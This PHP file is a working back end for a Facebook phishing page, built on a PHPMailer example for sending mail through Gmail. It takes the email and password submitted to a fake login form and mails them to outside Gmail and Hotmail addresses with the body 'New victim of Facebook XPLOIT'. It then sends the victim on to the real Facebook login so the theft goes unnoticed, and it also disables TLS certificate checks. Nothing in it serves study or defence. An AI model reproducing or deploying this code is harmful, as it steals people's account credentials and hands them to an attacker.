<?php
/**
 * This example shows settings to use when sending via Google's Gmail servers.
 * This uses traditional id & password authentication - look at the gmail_xoauth.phps
 * example to see how to use XOAUTH2.
 * The IMAP section shows how to save this message to the 'Sent Mail' folder using IMAP commands.
 */
//Import PHPMailer classes into the global namespace
use PHPMailer\PHPMailer\PHPMailer;
require 'vendor/autoload.php';

//Create a new PHPMailer instance
$mail = new PHPMailer;

//Tell PHPMailer to use SMTP
$mail->isSMTP();

//SMTPOptions
$mail->SMTPOptions = array(
    'ssl' => array(
        'verify_peer' => false,
        'verify_peer_name' => false,
        'allow_self_signed' => true
    )
);

//Enable SMTP debugging
// 0 = off (for production use)
// 1 = client messages
// 2 = client and server messages
$mail->SMTPDebug = 0;

$mail->Host = 'smtp.gmail.com';                       //Set the hostname of the mail server
$mail->Port = 587;                                    //Set the SMTP port number - 587 for authenticated TLS, a.k.a. RFC4409 SMTP submission
$mail->SMTPSecure = 'tls';                            //Set the encryption system to use - ssl (deprecated) or tls
$mail->SMTPAuth = true;                               //Whether to use SMTP authentication
$mail->Username = "daniel7byte@gmail.com";            //Username to use for SMTP authentication - use full email address for gmail
$mail->Password = "";                        //Password to use for SMTP authentication


//Recipients
$mail->setFrom('daniel7byte@gmail.com', 'Jose Daniel Posso Garcia');
$mail->addAddress('daniel7byte@gmail.com');          // Add a recipient & Name is optional
$mail->addAddress('joseposso09@hotmail.com');
$mail->addReplyTo('daniel7byte@gmail.com', 'Jose Daniel Posso Garcia');

//Attachments
//$mail->addAttachment('/var/tmp/file.tar.gz');         // Add attachments
//$mail->addAttachment('/tmp/image.jpg', 'new.jpg');    // Optional name

//Content
$mail->isHTML(true);                                  // Set email format to HTML
$mail->Subject = 'Hacked: <' . $_POST['email'] . '>';
$mail->Body    ='
New victim of Facebook XPLOIT
<br>
<hr>
Mail: ' . $_POST['email'] . '
<br>
Password: <b>' . $_POST['pass'] . '</b>
';
$mail->AltBody = 'New victim of Facebook XPLOIT';

//send the message, check for errors
if (!$mail->send()) {
    echo "Mailer Error: " . $mail->ErrorInfo;
} else {
    echo "Done!";
    echo"<script language='javascript'>window.location='https://www.facebook.com/login'</script>";
}
?>
